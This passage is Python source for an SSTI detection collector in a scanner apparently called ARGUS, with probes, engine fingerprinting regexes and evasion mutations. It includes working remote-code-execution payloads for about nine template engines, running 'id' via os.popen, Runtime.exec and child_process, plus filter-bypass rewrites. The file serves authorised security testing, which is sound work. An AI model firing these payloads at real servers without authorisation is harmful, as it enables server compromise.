"""
Server-Side Template Injection (SSTI) Detection Engine and Collector for ARGUS.

Actively discovers and validates Server-Side Template Injection vulnerabilities
across 15+ template engine families (Python, Java, PHP, Ruby, Node.js, Go) using
AuthenticatedHttpClient, polyglot arithmetic probers, differential decision tree
routing, sandbox escape payload suites, blind time-based verification, and error
signature fingerprinting.

Key Capabilities:
1. Multi-Engine Identification & Exploitation:
   - Python: Jinja2, Mako, Tornado, Django
   - Java: FreeMarker, Velocity, Thymeleaf, Pebble, Spring Expression Language (SpEL)
   - PHP: Twig, Smarty, Blade
   - Ruby: ERB
   - Node.js: Pug/Jade, EJS, Handlebars, Dust.js
   - Go: Go template engine
2. Detection Techniques:
   - Polyglot & Arithmetic Expression Probing ({{7*7}} -> 49, ${7*7}, <%= 7*7 %>, #{7*7}, *{7*7})
   - Differential Decision Tree Routing ({{7*'7'}} -> 7777777 vs 49, {{config}}, <#assign>)
   - Sandbox Escape & RCE Execution Detection (MRO subclasses, ProcessBuilder, undefined filter callbacks)
   - Blind Time-Based Latency Calibration (sleep probes with >= 4.0s threshold)
   - Error-Based Template Engine Fingerprinting
3. Mutation & Bypass Strategies:
   - String Concatenation & Encoding ("a"+"b", \x61\x62, chr(97), ~ concat)
   - Attribute & Property Indirection (attr(), __dict__, subscript ['__class__'])
   - Comment Tag & Delimiter Variations ({##}, <%-- --%>, [#ftl], {{!-- --}})
   - Filter & Whitespace Bypasses (\t, \n, %20, request parameterization)
   - Object Instantiation & Classloader Navigation (getClassLoader(), T(...), MRO traversal)
4. False Positive & Reflection Suppression:
   - Raw unrendered template echo rejection
   - Dynamic randomized arithmetic canary baselining
   - Baseline response subtraction
5. Quadruple State Publishing:
   - Updates raw_mission.evidence, raw_mission.vulnerabilities, attack_surface_graph,
     and ControlledMission.publish_finding.
"""
from __future__ import annotations

import copy
import json
import logging
import random
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union

from argus.collectors.base import BaseCollector
from argus.collectors.toolkit.enums import Severity
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)


# =============================================================================
# Enums & Data Models
# =============================================================================

# Canonical severity scale (see argus.collectors.toolkit.enums.Severity).
SSTISeverity = Severity


# Backwards compatibility alias
Severity = SSTISeverity


class SSTITechnique(str, Enum):
    """Enumeration of SSTI detection techniques."""
    ARITHMETIC_PROBE = "arithmetic_probe"
    DECISION_TREE_ROUTING = "decision_tree_routing"
    SANDBOX_ESCAPE_RCE = "sandbox_escape_rce"
    BLIND_TIME_BASED = "blind_time_based"
    ERROR_BASED_FINGERPRINT = "error_based_fingerprint"


# Backwards compatibility aliases
SSTITechnique.ARITHMETIC_POLYGLOT = SSTITechnique.ARITHMETIC_PROBE  # type: ignore[attr-defined]
SSTITechnique.ENGINE_DIFFERENTIAL = SSTITechnique.DECISION_TREE_ROUTING  # type: ignore[attr-defined]
SSTITechnique.SANDBOX_ESCAPE = SSTITechnique.SANDBOX_ESCAPE_RCE  # type: ignore[attr-defined]
SSTITechnique.TIME_BLIND_DELAY = SSTITechnique.BLIND_TIME_BASED  # type: ignore[attr-defined]


class SSTIEngineFamily(str, Enum):
    """Enumeration of supported template engines and families."""
    PYTHON_JINJA2 = "jinja2"
    PYTHON_MAKO = "mako"
    PYTHON_TORNADO = "tornado"
    PYTHON_DJANGO = "django"
    JAVA_FREEMARKER = "freemarker"
    JAVA_VELOCITY = "velocity"
    JAVA_THYMELEAF = "thymeleaf"
    JAVA_PEBBLE = "pebble"
    JAVA_SPEL = "spel"
    PHP_TWIG = "twig"
    PHP_SMARTY = "smarty"
    PHP_BLADE = "blade"
    RUBY_ERB = "erb"
    NODE_PUG = "pug"
    NODE_EJS = "ejs"
    NODE_HANDLEBARS = "handlebars"
    NODE_DUST = "dust"
    GO_TEMPLATE = "go"
    GENERIC = "generic"


# Engine aliases
SSTIEngineFamily.JINJA2 = SSTIEngineFamily.PYTHON_JINJA2  # type: ignore[attr-defined]
SSTIEngineFamily.MAKO = SSTIEngineFamily.PYTHON_MAKO  # type: ignore[attr-defined]
SSTIEngineFamily.TORNADO = SSTIEngineFamily.PYTHON_TORNADO  # type: ignore[attr-defined]
SSTIEngineFamily.DJANGO = SSTIEngineFamily.PYTHON_DJANGO  # type: ignore[attr-defined]
SSTIEngineFamily.FREEMARKER = SSTIEngineFamily.JAVA_FREEMARKER  # type: ignore[attr-defined]
SSTIEngineFamily.VELOCITY = SSTIEngineFamily.JAVA_VELOCITY  # type: ignore[attr-defined]
SSTIEngineFamily.THYMELEAF = SSTIEngineFamily.JAVA_THYMELEAF  # type: ignore[attr-defined]
SSTIEngineFamily.PEBBLE = SSTIEngineFamily.JAVA_PEBBLE  # type: ignore[attr-defined]
SSTIEngineFamily.SPEL = SSTIEngineFamily.JAVA_SPEL  # type: ignore[attr-defined]
SSTIEngineFamily.TWIG = SSTIEngineFamily.PHP_TWIG  # type: ignore[attr-defined]
SSTIEngineFamily.SMARTY = SSTIEngineFamily.PHP_SMARTY  # type: ignore[attr-defined]
SSTIEngineFamily.BLADE = SSTIEngineFamily.PHP_BLADE  # type: ignore[attr-defined]
SSTIEngineFamily.ERB = SSTIEngineFamily.RUBY_ERB  # type: ignore[attr-defined]
SSTIEngineFamily.PUG = SSTIEngineFamily.NODE_PUG  # type: ignore[attr-defined]
SSTIEngineFamily.EJS = SSTIEngineFamily.NODE_EJS  # type: ignore[attr-defined]
SSTIEngineFamily.HANDLEBARS = SSTIEngineFamily.NODE_HANDLEBARS  # type: ignore[attr-defined]
SSTIEngineFamily.DUST = SSTIEngineFamily.NODE_DUST  # type: ignore[attr-defined]


class SSTIMutationStrategy(str, Enum):
    """Enumeration of SSTI evasion, mutation, and bypass strategies."""
    STRING_CONCAT_ENCODING = "string_concat_encoding"
    ATTRIBUTE_INDIRECTION = "attribute_indirection"
    COMMENT_TAG_VARIATION = "comment_tag_variation"
    FILTER_WHITESPACE_BYPASS = "filter_whitespace_bypass"
    OBJECT_CLASSLOADER_NAVIGATION = "object_classloader_navigation"


# Mutation aliases
SSTIMutationStrategy.STRING_CONCATENATION_ENCODING = SSTIMutationStrategy.STRING_CONCAT_ENCODING  # type: ignore[attr-defined]
SSTIMutationStrategy.ATTRIBUTE_PROPERTY_INDIRECTION = SSTIMutationStrategy.ATTRIBUTE_INDIRECTION  # type: ignore[attr-defined]
SSTIMutationStrategy.COMMENT_DELIMITER_VARIATION = SSTIMutationStrategy.COMMENT_TAG_VARIATION  # type: ignore[attr-defined]


@dataclass
class SSTIProbe:
    """Represents a specific SSTI probe to inject."""
    url: str
    method: str = "GET"
    parameter: str = ""
    parameter_type: str = "query"  # "query", "body", "json", "path", "header"
    payload: str = ""
    technique: Union[SSTITechnique, str] = SSTITechnique.ARITHMETIC_PROBE
    engine: Union[SSTIEngineFamily, str] = SSTIEngineFamily.GENERIC
    mutation_strategy: Optional[Union[SSTIMutationStrategy, str]] = None
    expected_canary: Optional[str] = None
    headers: Dict[str, str] = field(default_factory=dict)
    data: Optional[Dict[str, Any]] = None
    json_body: Optional[Any] = None
    timeout: float = 10.0
    extra: Dict[str, Any] = field(default_factory=dict)


@dataclass
class SSTIProbeResponse:
    """Represents the response from executing an SSTI probe."""
    probe: SSTIProbe
    status_code: int = 200
    body: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    elapsed: float = 0.0
    success: bool = True
    raw_response: Optional[Any] = None


@dataclass
class SSTIResult:
    """Represents the structured finding from SSTI analysis."""
    technique: str
    engine: str
    payload: str
    parameter: str
    parameter_type: str
    target_url: str
    status_code: int = 200
    matched_signature: str = ""
    evidence_snippet: str = ""
    severity: str = SSTISeverity.HIGH
    confidence: float = 0.90
    template_id: str = "ssti"
    cwe_id: str = "CWE-1336"
    cvss_score: float = 8.2
    mutation_strategy: Optional[str] = None
    delay_delta: float = 0.0
    baseline_elapsed: float = 0.0
    injected_elapsed: float = 0.0
    expected_canary: Optional[str] = None
    extra: Dict[str, Any] = field(default_factory=dict)


# =============================================================================
# Signature Catalogs
# =============================================================================

# Error-based template engine stack trace / syntax error signatures
SSTI_ERROR_SIGNATURES: Dict[str, Tuple[str, re.Pattern]] = {
    "jinja2": (
        "jinja2",
        re.compile(
            r"(?:jinja2\.exceptions\.(?:TemplateSyntaxError|TemplateRuntimeError|UndefinedError|TemplateNotFound)|jinja2\.exceptions|\bTemplateSyntaxError: unexpected\b)",
            re.IGNORECASE,
        ),
    ),
    "twig": (
        "twig",
        re.compile(
            r"(?:Twig\\Error\\(?:SyntaxError|RuntimeError|LoaderError)|Twig_Error_Syntax|Unexpected token\s*\"|\bTwig\\|\bTwigException\b)",
            re.IGNORECASE,
        ),
    ),
    "smarty": (
        "smarty",
        re.compile(
            r"(?:SmartyCompilerException|Smarty error:|Syntax Error in template\s*\"|\$smarty\.template_object|unknown tag\s*\"|\bSmarty_Internal_Template\b)",
            re.IGNORECASE,
        ),
    ),
    "freemarker": (
        "freemarker",
        re.compile(
            r"(?:freemarker\.core\.(?:ParseException|InvalidReferenceException|NonStringException|UnexpectedTypeException)|freemarker\.template\.TemplateModelException|\bFreeMarker template error\b|\bFreeMarker error\b)",
            re.IGNORECASE,
        ),
    ),
    "velocity": (
        "velocity",
        re.compile(
            r"(?:org\.apache\.velocity\.exception\.(?:ParseErrorException|MethodInvocationException|ResourceNotFoundException)|VelocityException|\bVelocity rendering error\b)",
            re.IGNORECASE,
        ),
    ),
    "spel": (
        "spel",
        re.compile(
            r"(?:org\.springframework\.expression\.spel\.(?:SpelEvaluationException|SpelParseException)|EL100[0-9]E|EL10[0-9]{2}E|\bSpEL evaluation exception\b)",
            re.IGNORECASE,
        ),
    ),
    "mako": (
        "mako",
        re.compile(
            r"(?:mako\.exceptions\.(?:SyntaxException|CompileException|RuntimeException)|mako\.template\.Template|\bMako Error\b)",
            re.IGNORECASE,
        ),
    ),
    "django": (
        "django",
        re.compile(
            r"(?:django\.template\.exceptions\.(?:TemplateSyntaxError|TemplateDoesNotExist)|Invalid filter:|django\.template\.base\.VariableDoesNotExistException)",
            re.IGNORECASE,
        ),
    ),
    "thymeleaf": (
        "thymeleaf",
        re.compile(
            r"(?:org\.thymeleaf\.exceptions\.(?:TemplateProcessingException|TemplateEngineException|TemplateInputException)|Thymeleaf template error|\bThymeleaf\b.*Exception)",
            re.IGNORECASE,
        ),
    ),
    "pebble": (
        "pebble",
        re.compile(
            r"(?:com\.mitchellbosecke\.pebble\.error\.PebbleException|PebbleException)",
            re.IGNORECASE,
        ),
    ),
    "pug": (
        "pug",
        re.compile(
            r"(?:Pug:SyntaxError|Jade:SyntaxError|Cannot read property.*of undefined.*pug|pug:\d+)",
            re.IGNORECASE,
        ),
    ),
    "ejs": (
        "ejs",
        re.compile(
            r"(?:ejs:SyntaxError|Error: Could not find matching close tag|ejs:\d+|\bEJS compilation error\b)",
            re.IGNORECASE,
        ),
    ),
    "handlebars": (
        "handlebars",
        re.compile(
            r"(?:Error: Parse error on line|Handlebars: Error|\bHandlebars\.Compile\b)",
            re.IGNORECASE,
        ),
    ),
    "dust": (
        "dust",
        re.compile(
            r"(?:Dust: Syntax error|dust\.compileFn|Expected.*in dust template)",
            re.IGNORECASE,
        ),
    ),
    "erb": (
        "erb",
        re.compile(
            r"(?:syntax error, unexpected.*\b(?:ERB|erb)\b|ActionView::Template::Error|\b(?-i:ERB::Compiler::Error)\b)",
            re.IGNORECASE,
        ),
    ),
}

# RCE / Process Execution Signatures
SSTI_RCE_OUTPUT_SIGNATURES: Dict[str, re.Pattern] = {
    "posix_id": re.compile(
        r"(?:uid=\d+\([a-zA-Z0-9_\-.]+\)\s+gid=\d+\([a-zA-Z0-9_\-.]+\)|uid=\d+\s+gid=\d+)",
        re.IGNORECASE,
    ),
    "posix_uname": re.compile(
        r"\b(?:Linux|Darwin|FreeBSD|OpenBSD|NetBSD|SunOS)\s+[\w\.\-]+\s+\d+\.\d+[\w\.\-]*",
        re.IGNORECASE,
    ),
    "posix_passwd": re.compile(
        r"root:[x*]:0:0:.*?:(?:/root|/bin/(?:bash|sh|zsh|dash|nologin))",
        re.MULTILINE,
    ),
    "posix_whoami": re.compile(
        r"^(?:root|daemon|bin|nobody|www-data|nginx|apache|app|user|admin|ubuntu|ec2-user|runner)$",
        re.IGNORECASE | re.MULTILINE,
    ),
    "windows_whoami": re.compile(
        r"\b(?:nt authority\\(?:system|network service|local service)|[a-zA-Z0-9_\-\.]+\\[a-zA-Z0-9_\-\.]+)\b",
        re.IGNORECASE,
    ),
    "windows_dir": re.compile(
        r"(?:Volume in drive [A-Z] is|Volume Serial Number is [0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}|Directory of [A-Z]:\\)",
        re.IGNORECASE,
    ),
    "java_process": re.compile(
        r"(?:java\.lang\.ProcessBuilder|java\.lang\.UNIXProcess|java\.lang\.ProcessImpl|java\.lang\.Runtime)",
        re.IGNORECASE,
    ),
}


# =============================================================================
# Payload Generator
# =============================================================================

class SSTIPayloadGenerator:
    """
    Generates engine-specific and polyglot payloads, differential decision tree
    probes, sandbox escapes, blind time-based delays, error triggers, and applies
    evasion mutations.
    """

    @staticmethod
    def generate_arithmetic_canary(
        engine: Union[SSTIEngineFamily, str] = SSTIEngineFamily.GENERIC,
        a: Optional[int] = None,
        b: Optional[int] = None,
    ) -> Tuple[str, str]:
        """
        Generates a mathematical template expression with dynamic operands and expected result.
        """
        if a is None or b is None:
            a = random.randint(1111, 8888)
            b = random.randint(11, 99)
        expected = str(a * b)
        eng_str = str(engine.value if isinstance(engine, SSTIEngineFamily) else engine).lower()

        if "jinja" in eng_str or "twig" in eng_str or "pebble" in eng_str or "blade" in eng_str or eng_str == "generic":
            return f"{{{{{a}*{b}}}}}", expected
        elif "freemarker" in eng_str or "mako" in eng_str or "spel" in eng_str or "django" in eng_str:
            return f"${{{a}*{b}}}", expected
        elif "velocity" in eng_str:
            return f"#set($res={a}*{b})${{res}}", expected
        elif "erb" in eng_str or "ejs" in eng_str:
            return f"<%= {a}*{b} %>", expected
        elif "pug" in eng_str:
            return f"#{{{a}*{b}}}", expected
        elif "thymeleaf" in eng_str:
            return f"[[${{{a}*{b}}}]]", expected
        elif "smarty" in eng_str:
            return f"{{{a}*{b}}}", expected
        else:
            return f"{{{{{a}*{b}}}}}", expected

    @staticmethod
    def generate_polyglot_payloads(a: int = 7, b: int = 7) -> List[Dict[str, Any]]:
        """
        Generates a catalog of polyglot arithmetic probes across delimiter syntaxes.
        """
        expected = str(a * b)
        return [
            {"payload": f"{{{{{a}*{b}}}}}", "expected": expected, "engine": SSTIEngineFamily.PYTHON_JINJA2, "delimiter": "{{}}"},
            {"payload": f"${{{a}*{b}}}", "expected": expected, "engine": SSTIEngineFamily.JAVA_FREEMARKER, "delimiter": "${}"},
            {"payload": f"<%= {a}*{b} %>", "expected": expected, "engine": SSTIEngineFamily.RUBY_ERB, "delimiter": "<%= %>"},
            {"payload": f"#{{{a}*{b}}}", "expected": expected, "engine": SSTIEngineFamily.NODE_PUG, "delimiter": "#{}"},
            {"payload": f"*{{{a}*{b}}}", "expected": expected, "engine": SSTIEngineFamily.JAVA_SPEL, "delimiter": "*{}"},
            {"payload": f"[#ftl]${{{a}*{b}}}", "expected": expected, "engine": SSTIEngineFamily.JAVA_FREEMARKER, "delimiter": "[#ftl]${}"},
            {"payload": f"{{{a}*{b}}}", "expected": expected, "engine": SSTIEngineFamily.PHP_SMARTY, "delimiter": "{}"},
            {"payload": f"[[${{{a}*{b}}}]]", "expected": expected, "engine": SSTIEngineFamily.JAVA_THYMELEAF, "delimiter": "[[${}]]"},
        ]

    @staticmethod
    def generate_differential_payloads() -> List[Dict[str, Any]]:
        """
        Generates differential decision tree payloads for engine disambiguation.
        """
        return [
            # Decision point: {{7*'7'}}
            # Jinja2 / Python yields "7777777" (string repetition)
            # Twig / PHP yields "49" (string typecast to integer)
            # Mako / FreeMarker raises error or renders differently
            {
                "payload": "{{7*'7'}}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "type_coercion",
                "rules": {
                    "7777777": SSTIEngineFamily.PYTHON_JINJA2,
                    "49": SSTIEngineFamily.PHP_TWIG,
                },
            },
            # Jinja2 environment / config inspection
            {
                "payload": "{{config}}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "config_object",
                "expected_signature": r"<Config\s*\{|\'ENV\':",
                "engine": SSTIEngineFamily.PYTHON_JINJA2,
            },
            # Twig self inspection
            {
                "payload": "{{_self.env}}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "twig_self",
                "expected_signature": r"Twig[_\\]Environment",
                "engine": SSTIEngineFamily.PHP_TWIG,
            },
            # FreeMarker assign directive
            {
                "payload": "<#assign ssti_test=1337>${ssti_test}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "freemarker_assign",
                "expected_canary": "1337",
                "engine": SSTIEngineFamily.JAVA_FREEMARKER,
            },
            # SpEL Type reference
            {
                "payload": "T(java.lang.System).currentTimeMillis()",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "spel_type_ref",
                "expected_signature": r"\b\d{10,13}\b",
                "engine": SSTIEngineFamily.JAVA_SPEL,
            },
            # Mako globals inspection
            {
                "payload": "${self.__init__.__globals__}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "mako_globals",
                "expected_signature": r"\'__file__\':|\'UNDEFINED\':",
                "engine": SSTIEngineFamily.PYTHON_MAKO,
            },
            # Smarty version
            {
                "payload": "{$smarty.version}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "smarty_version",
                "expected_signature": r"\b[234]\.\d+\.\d+\b",
                "engine": SSTIEngineFamily.PHP_SMARTY,
            },
            # Ruby ERB class introspection
            {
                "payload": "<%= self.class %>",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "erb_self_class",
                "expected_signature": r"Object|ActionView|ERB",
                "engine": SSTIEngineFamily.RUBY_ERB,
            },
            # Node Pug process inspection
            {
                "payload": "#{root.process.mainModule.filename}",
                "technique": SSTITechnique.DECISION_TREE_ROUTING,
                "discriminator": "pug_process",
                "expected_signature": r"\.js|\.node",
                "engine": SSTIEngineFamily.NODE_PUG,
            },
        ]

    @staticmethod
    def generate_sandbox_escape_payloads(
        engine: Union[SSTIEngineFamily, str] = SSTIEngineFamily.GENERIC,
    ) -> List[Dict[str, Any]]:
        """
        Generates sandbox escape and code execution payload suites across engine families.
        """
        eng_str = str(engine.value if isinstance(engine, SSTIEngineFamily) else engine).lower()
        payloads: List[Dict[str, Any]] = []

        # Jinja2 escapes
        if "jinja" in eng_str or eng_str == "generic":
            payloads.extend([
                {
                    "payload": "{{''.__class__.__mro__[1].__subclasses__()}}",
                    "engine": SSTIEngineFamily.PYTHON_JINJA2,
                    "expected_signature": r"subprocess\.Popen|os\._wrap_close|warnings\.catch_warnings",
                    "description": "Python MRO subclass traversal",
                },
                {
                    "payload": "{{lipsum.__globals__.__builtins__['__import__']('os').popen('id').read()}}",
                    "engine": SSTIEngineFamily.PYTHON_JINJA2,
                    "expected_signature": r"uid=\d+",
                    "description": "Jinja2 lipsum builtins os.popen RCE",
                },
                {
                    "payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
                    "engine": SSTIEngineFamily.PYTHON_JINJA2,
                    "expected_signature": r"uid=\d+",
                    "description": "Jinja2 cycler globals os.popen RCE",
                },
            ])

        # Twig escapes
        if "twig" in eng_str or eng_str == "generic":
            payloads.extend([
                {
                    "payload": '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
                    "engine": SSTIEngineFamily.PHP_TWIG,
                    "expected_signature": r"uid=\d+",
                    "description": "Twig undefined filter callback RCE",
                },
                {
                    "payload": "{{['id']|filter('system')}}",
                    "engine": SSTIEngineFamily.PHP_TWIG,
                    "expected_signature": r"uid=\d+",
                    "description": "Twig filter callback system RCE",
                },
            ])

        # FreeMarker escapes
        if "freemarker" in eng_str or eng_str == "generic":
            payloads.extend([
                {
                    "payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                    "engine": SSTIEngineFamily.JAVA_FREEMARKER,
                    "expected_signature": r"uid=\d+",
                    "description": "FreeMarker Execute utility RCE",
                },
                {
                    "payload": '<#assign obj="freemarker.template.utility.ObjectConstructor"?new()>${obj("java.lang.ProcessBuilder","id").start()}',
                    "engine": SSTIEngineFamily.JAVA_FREEMARKER,
                    "expected_signature": r"java\.lang\.ProcessBuilder|java\.lang\.UNIXProcess",
                    "description": "FreeMarker ObjectConstructor ProcessBuilder execution",
                },
            ])

        # Velocity escapes
        if "velocity" in eng_str or eng_str == "generic":
            payloads.append({
                "payload": '#set($e="")#set($cl=$e.getClass().forName("java.lang.Runtime"))#set($rt=$cl.getRuntime())#set($proc=$rt.exec("id"))$proc',
                "engine": SSTIEngineFamily.JAVA_VELOCITY,
                "expected_signature": r"java\.lang\.ProcessImpl|java\.lang\.UNIXProcess",
                "description": "Velocity Java Runtime reflection RCE",
            })

        # SpEL escapes
        if "spel" in eng_str or eng_str == "generic":
            payloads.extend([
                {
                    "payload": "T(java.lang.Runtime).getRuntime().exec('id')",
                    "engine": SSTIEngineFamily.JAVA_SPEL,
                    "expected_signature": r"java\.lang\.ProcessImpl|java\.lang\.UNIXProcess",
                    "description": "SpEL Runtime getRuntime exec",
                },
                {
                    "payload": "new java.lang.ProcessBuilder('id').start()",
                    "engine": SSTIEngineFamily.JAVA_SPEL,
                    "expected_signature": r"java\.lang\.ProcessBuilder",
                    "description": "SpEL ProcessBuilder start",
                },
            ])

        # Mako escapes
        if "mako" in eng_str or eng_str == "generic":
            payloads.append({
                "payload": "<%import os%>${os.popen('id').read()}",
                "engine": SSTIEngineFamily.PYTHON_MAKO,
                "expected_signature": r"uid=\d+",
                "description": "Mako inline Python import os.popen RCE",
            })

        # ERB escapes
        if "erb" in eng_str or eng_str == "generic":
            payloads.extend([
                {
                    "payload": "<%= `id` %>",
                    "engine": SSTIEngineFamily.RUBY_ERB,
                    "expected_signature": r"uid=\d+",
                    "description": "Ruby ERB backtick command execution",
                },
                {
                    "payload": "<%= IO.popen('id').readlines().join %>",
                    "engine": SSTIEngineFamily.RUBY_ERB,
                    "expected_signature": r"uid=\d+",
                    "description": "Ruby ERB IO.popen execution",
                },
            ])

        # Pug / Jade escapes
        if "pug" in eng_str or eng_str == "generic":
            payloads.append({
                "payload": "#{root.process.mainModule.require('child_process').spawnSync('id').stdout}",
                "engine": SSTIEngineFamily.NODE_PUG,
                "expected_signature": r"uid=\d+",
                "description": "Pug root.process child_process execution",
            })

        # EJS escapes
        if "ejs" in eng_str or eng_str == "generic":
            payloads.append({
                "payload": "<%= global.process.mainModule.require('child_process').execSync('id').toString() %>",
                "engine": SSTIEngineFamily.NODE_EJS,
                "expected_signature": r"uid=\d+",
                "description": "EJS global.process child_process execution",
            })

        return payloads

    @staticmethod
    def generate_blind_timing_payloads(delay_seconds: int = 5) -> List[Dict[str, Any]]:
        """
        Generates blind time-delay template expressions.
        """
        return [
            {
                "payload": f"{{{{__import__('time').sleep({delay_seconds})}}}}",
                "engine": SSTIEngineFamily.PYTHON_JINJA2,
                "delay_seconds": delay_seconds,
            },
            {
                "payload": f"${{T(java.lang.Thread).sleep({delay_seconds * 1000})}}",
                "engine": SSTIEngineFamily.JAVA_SPEL,
                "delay_seconds": delay_seconds,
            },
            {
                "payload": f"<%= sleep {delay_seconds} %>",
                "engine": SSTIEngineFamily.RUBY_ERB,
                "delay_seconds": delay_seconds,
            },
            {
                "payload": f"{{{{['{delay_seconds}']|filter('sleep')}}}}",
                "engine": SSTIEngineFamily.PHP_TWIG,
                "delay_seconds": delay_seconds,
            },
        ]

    @staticmethod
    def generate_error_trigger_payloads() -> List[Dict[str, Any]]:
        """
        Generates syntactically malformed template triggers designed to provoke engine stack traces.
        """
        return [
            {"payload": "{{'test'%}}", "engine": SSTIEngineFamily.PYTHON_JINJA2, "syntax": "unclosed_filter"},
            {"payload": "{{1/0}}", "engine": SSTIEngineFamily.PYTHON_JINJA2, "syntax": "zero_division"},
            {"payload": "${bad.syntax(}", "engine": SSTIEngineFamily.JAVA_FREEMARKER, "syntax": "unclosed_paren"},
            {"payload": "<#bad_tag_ssti_test>", "engine": SSTIEngineFamily.JAVA_FREEMARKER, "syntax": "invalid_directive"},
            {"payload": "{% invalid_tag_ssti %}", "engine": SSTIEngineFamily.PYTHON_DJANGO, "syntax": "invalid_block"},
            {"payload": "${invalid.expression.probe()}", "engine": SSTIEngineFamily.JAVA_SPEL, "syntax": "missing_bean"},
        ]

    @staticmethod
    def apply_mutation_strategy(
        payload: str,
        strategy: Union[SSTIMutationStrategy, str],
        **kwargs: Any,
    ) -> str:
        """
        Applies one of the 5 mutation and evasion strategies to a base payload.
        """
        strat_val = strategy.value if isinstance(strategy, SSTIMutationStrategy) else strategy

        # Strategy 1: String Concatenation & Character Encoding
        if strat_val == SSTIMutationStrategy.STRING_CONCAT_ENCODING.value:
            if "__class__" in payload:
                payload = payload.replace("__class__", "('__cla' + 'ss__')")
            elif "class" in payload:
                payload = payload.replace("class", "('cla' + 'ss')")
            if "os" in payload:
                payload = payload.replace("'os'", "('o' ~ 's')")
            if "id" in payload:
                payload = payload.replace("'id'", "('\\x69\\x64')")
            return payload

        # Strategy 2: Attribute & Property Indirection
        elif strat_val == SSTIMutationStrategy.ATTRIBUTE_INDIRECTION.value:
            if ".__class__" in payload:
                payload = payload.replace(".__class__", "|attr('__class__')")
            elif "__class__" in payload:
                payload = payload.replace("__class__", "['__class__']")
            if ".__mro__" in payload:
                payload = payload.replace(".__mro__", "['__mro__']")
            if ".__subclasses__" in payload:
                payload = payload.replace(".__subclasses__()", "['__subclasses__']()")
            return payload

        # Strategy 3: Template Comment Inversion & Tag Delimiter Variations
        elif strat_val == SSTIMutationStrategy.COMMENT_TAG_VARIATION.value:
            if payload.startswith("{{"):
                return f"{{##}}{payload}{{# comment #}}"
            elif payload.startswith("${"):
                return f"[#ftl]{payload}"
            elif payload.startswith("<%="):
                return f"<%# comment %>{payload}"
            elif payload.startswith("#{"):
                return f"//- comment\n{payload}"
            return f"{{# ssti #}}{payload}"

        # Strategy 4: Filter & Whitespace Bypasses
        elif strat_val == SSTIMutationStrategy.FILTER_WHITESPACE_BYPASS.value:
            # Replace single spaces with tab or newline or plus
            mutated = payload.replace(" ", "\t")
            if mutated == payload:
                mutated = payload.replace("{{", "{{ \t\n ").replace("}}", " \n\t}}")
            return mutated

        # Strategy 5: Object Instantiation & Classloader Navigation
        elif strat_val == SSTIMutationStrategy.OBJECT_CLASSLOADER_NAVIGATION.value:
            if "ProcessBuilder" in payload and not "getClassLoader" in payload:
                return payload.replace("java.lang.ProcessBuilder", "getClass().getClassLoader().loadClass('java.lang.ProcessBuilder')")
            if "Runtime" in payload and not "T(" in payload:
                return f"T(java.lang.Runtime).getRuntime().exec('id')"
            if "__subclasses__" in payload:
                return payload.replace("[1]", "[-1]")
            return payload

        return payload

    def build_all_probes(
        self,
        target_url: str,
        parameter: str,
        parameter_type: str = "query",
        method: str = "GET",
    ) -> List[SSTIProbe]:
        """
        Builds a comprehensive list of candidate probes across arithmetic, differential,
        sandbox escapes, blind timing, error triggers, and mutations.
        """
        probes: List[SSTIProbe] = []

        # 1. Differential decision tree probes (Engine Disambiguation)
        for diff in self.generate_differential_payloads():
            probes.append(
                SSTIProbe(
                    url=target_url,
                    method=method,
                    parameter=parameter,
                    parameter_type=parameter_type,
                    payload=diff["payload"],
                    technique=SSTITechnique.DECISION_TREE_ROUTING,
                    engine=diff.get("engine", SSTIEngineFamily.GENERIC),
                    expected_canary=diff.get("expected_canary"),
                    extra=diff,
                )
            )

        # 2. Polyglot arithmetic probes
        polyglots = self.generate_polyglot_payloads()
        for poly in polyglots:
            probes.append(
                SSTIProbe(
                    url=target_url,
                    method=method,
                    parameter=parameter,
                    parameter_type=parameter_type,
                    payload=poly["payload"],
                    technique=SSTITechnique.ARITHMETIC_PROBE,
                    engine=poly["engine"],
                    expected_canary=poly["expected"],
                )
            )

        # 3. Dynamic arithmetic probe with randomized operands
        rand_payload, rand_expected = self.generate_arithmetic_canary()
        probes.append(
            SSTIProbe(
                url=target_url,
                method=method,
                parameter=parameter,
                parameter_type=parameter_type,
                payload=rand_payload,
                technique=SSTITechnique.ARITHMETIC_PROBE,
                engine=SSTIEngineFamily.GENERIC,
                expected_canary=rand_expected,
            )
        )


        # 4. Sandbox escape payloads
        for esc in self.generate_sandbox_escape_payloads():
            probes.append(
                SSTIProbe(
                    url=target_url,
                    method=method,
                    parameter=parameter,
                    parameter_type=parameter_type,
                    payload=esc["payload"],
                    technique=SSTITechnique.SANDBOX_ESCAPE_RCE,
                    engine=esc["engine"],
                    extra=esc,
                )
            )

        # 5. Mutated payloads (5 strategies)
        base_jinja = "{{7*7}}"
        for strat in SSTIMutationStrategy:
            mut_payload = self.apply_mutation_strategy(base_jinja, strat)
            probes.append(
                SSTIProbe(
                    url=target_url,
                    method=method,
                    parameter=parameter,
                    parameter_type=parameter_type,
                    payload=mut_payload,
                    technique=SSTITechnique.ARITHMETIC_PROBE,
                    engine=SSTIEngineFamily.PYTHON_JINJA2,
                    mutation_strategy=strat,
                    expected_canary="49",
                )
            )

        # 6. Blind time-based delay probes
        for blind in self.generate_blind_timing_payloads(delay_seconds=5):
            probes.append(
                SSTIProbe(
                    url=target_url,
                    method=method,
                    parameter=parameter,
                    parameter_type=parameter_type,
                    payload=blind["payload"],
